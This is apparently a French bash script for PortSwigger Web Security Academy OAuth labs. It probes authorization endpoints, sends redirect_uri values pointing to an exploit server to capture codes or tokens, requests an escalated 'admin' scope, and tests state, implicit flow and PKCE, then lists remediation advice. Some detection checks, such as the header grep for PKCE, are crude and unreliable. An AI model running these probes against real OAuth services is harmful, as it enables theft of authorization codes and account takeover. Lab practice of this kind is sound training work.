#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
OAUTH_AUTHORIZE="/oauth2/authorize"
OAUTH_TOKEN="/oauth2/token"
CLIENT_ID="acme"
EXPLOIT_SERVER="https://exploit-<your-lab>.exploit-server.net"
REDIRECT_URI="$EXPLOIT_SERVER/callback"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 0. Exemple d'application OAuth à enregistrer sur le serveur d'exploitation
show_oauth_app_registration() {
    print_sep
    echo "[0] Exemple d'application OAuth à enregistrer sur le serveur d'exploitation (exploit server)"
    echo "Utilisez ces valeurs lors de l'enregistrement de votre application sur le serveur OAuth cible :"
    echo ""
    echo "Nom de l'application : ExploitApp"
    echo "Client ID            : $CLIENT_ID"
    echo "Client Secret        : (généré automatiquement ou à noter)"
    echo "Redirect URI         : $REDIRECT_URI"
    echo "Scopes               : openid profile email (ou admin, selon le lab)"
    echo "Type d'application   : Web application / Confidential"
    echo "Grant type           : Authorization Code"
    echo ""
    echo "Après l'enregistrement, utilisez le lien suivant pour lancer l'authentification :"
    echo "$TARGET_URL$OAUTH_AUTHORIZE?client_id=$CLIENT_ID&response_type=code&redirect_uri=$REDIRECT_URI&scope=openid"
    echo ""
    echo "Sur l'exploit server, créez un endpoint /callback pour capturer le code ou le token."
    echo "Vous pouvez visualiser les requêtes reçues dans l'interface de l'exploit server PortSwigger."
}

# 1. Découverte et analyse des endpoints OAuth
analyze_oauth_endpoints() {
    print_sep
    echo "[1] Analyse des endpoints OAuth"
    for path in "/.well-known/openid-configuration" "/.well-known/oauth-authorization-server" "$OAUTH_AUTHORIZE" "$OAUTH_TOKEN"; do
        url="$TARGET_URL$path"
        resp=$(curl -sk "$url")
        if [[ ! -z "$resp" && ! "$resp" =~ "Not Found" && ! "$resp" =~ "404" ]]; then
            echo "  [+] Endpoint trouvé : $url"
            echo "$resp" | head -n 8
        fi
    done
}

# 2. Test d’open redirect sur redirect_uri
test_open_redirect() {
    print_sep
    echo "[2] Test d’open redirect sur redirect_uri"
    evil_uri="$EXPLOIT_SERVER/callback"
    url="$TARGET_URL$OAUTH_AUTHORIZE?client_id=$CLIENT_ID&response_type=code&redirect_uri=$evil_uri"
    resp=$(curl -sk -I "$url")
    if echo "$resp" | grep -i "Location: $evil_uri" >/dev/null; then
        echo "  [+] Open redirect détecté sur redirect_uri !"
        echo "$resp" | grep -i "Location:"
    else
        echo "  [-] Pas d’open redirect évident."
    fi
}

# 3. Test de vulnérabilité CSRF/state
test_state_parameter() {
    print_sep
    echo "[3] Test de vulnérabilité CSRF/state"
    url="$TARGET_URL$OAUTH_AUTHORIZE?client_id=$CLIENT_ID&response_type=code&redirect_uri=$REDIRECT_URI"
    resp=$(curl -sk -I "$url")
    if echo "$resp" | grep -i "state" >/dev/null; then
        echo "  [+] Paramètre state présent dans la réponse."
    else
        echo "  [-] Pas de paramètre state (risque CSRF possible)."
    fi
}

# 4. Test de l’implict flow (token dans l’URL)
test_implicit_flow() {
    print_sep
    echo "[4] Test de l’implict flow (token dans l’URL)"
    url="$TARGET_URL$OAUTH_AUTHORIZE?client_id=$CLIENT_ID&response_type=token&redirect_uri=$REDIRECT_URI"
    resp=$(curl -sk -L "$url")
    if echo "$resp" | grep -Eo "access_token=[^&\"]+"; then
        echo "  [+] Implicit flow détecté, access_token exposé dans l’URL !"
    else
        echo "  [-] Pas d’access_token détecté dans l’URL."
    fi
}

# 5. Test de code leakage (code dans l’URL ou via Referer)
test_code_leakage() {
    print_sep
    echo "[5] Test de code leakage (code dans l’URL ou via Referer)"
    url="$TARGET_URL$OAUTH_AUTHORIZE?client_id=$CLIENT_ID&response_type=code&redirect_uri=$REDIRECT_URI"
    resp=$(curl -sk -L -D - "$url")
    if echo "$resp" | grep -Eo "code=[a-zA-Z0-9]+"; then
        echo "  [+] Code OAuth détecté dans l’URL ou la réponse !"
    else
        echo "  [-] Pas de code OAuth détecté."
    fi
}

# 6. Test de PKCE (protection contre interception du code)
test_pkce() {
    print_sep
    echo "[6] Test de la présence de PKCE"
    code_verifier="testpkce1234567890"
    code_challenge=$(echo -n "$code_verifier" | openssl dgst -sha256 -binary | openssl base64 | tr -d '=' | tr '/+' '_-')
    url="$TARGET_URL$OAUTH_AUTHORIZE?client_id=$CLIENT_ID&response_type=code&redirect_uri=$REDIRECT_URI&code_challenge=$code_challenge&code_challenge_method=S256"
    resp=$(curl -sk -I "$url")
    if echo "$resp" | grep -i "code_challenge" >/dev/null; then
        echo "  [+] PKCE supporté (paramètre code_challenge accepté)."
    else
        echo "  [-] PKCE non supporté ou non exigé."
    fi
}

# 7. Test SSRF via registration (jwks_uri, jku, request_uri)
test_ssrf_registration() {
    print_sep
    echo "[7] Test SSRF via registration (jwks_uri, jku, request_uri)"
    echo "- Enregistrez une application OAuth sur le serveur cible avec une URL contrôlée (jwks_uri, jku, request_uri) pointant vers $EXPLOIT_SERVER."
    echo "- Surveillez les logs de l’exploit server pour détecter une requête du serveur OAuth."
}

# 8. Test manipulation des scopes
test_scope_manipulation() {
    print_sep
    echo "[8] Test de manipulation des scopes"
    url="$TARGET_URL$OAUTH_AUTHORIZE?client_id=$CLIENT_ID&response_type=code&redirect_uri=$REDIRECT_URI&scope=openid%20admin"
    resp=$(curl -sk -I "$url")
    if echo "$resp" | grep -i "admin" >/dev/null; then
        echo "  [+] Scope admin accepté dans la réponse !"
    else
        echo "  [-] Scope admin refusé ou ignoré."
    fi
}

# 9. Conseils/remédiation
print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Validez strictement redirect_uri (whitelist, comparaison stricte)."
    echo "- Exigez et liez un paramètre state unique à la session utilisateur."
    echo "- Utilisez PKCE pour protéger le code d’autorisation."
    echo "- Ne jamais exposer access_token ou code dans l’URL ou via Referer."
    echo "- Filtrez et validez tous les paramètres d’enregistrement (jwks_uri, jku, request_uri)."
    echo "- Limitez les scopes accessibles et vérifiez leur usage côté serveur."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/oauth"
}

# 10. Synthèse
print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "0. Exemple d'enregistrement d'application sur l'exploit server."
    echo "1. Découverte des endpoints OAuth."
    echo "2. Tests d’open redirect, CSRF/state, implicit flow, code leakage, PKCE, SSRF, scope."
    echo "3. Contrôle automatisé ou semi-automatisé de la réponse."
    echo "4. Conseils de remédiation PortSwigger."
    print_sep
}

# Exécution séquentielle
echo "=== Script PortSwigger OAuth Authentication : analyse, attaque et contrôle ==="
show_oauth_app_registration
analyze_oauth_endpoints
test_open_redirect
test_state_parameter
test_implicit_flow
test_code_leakage
test_pkce
test_ssrf_registration
test_scope_manipulation
print_remediation
print_summary

# End of script
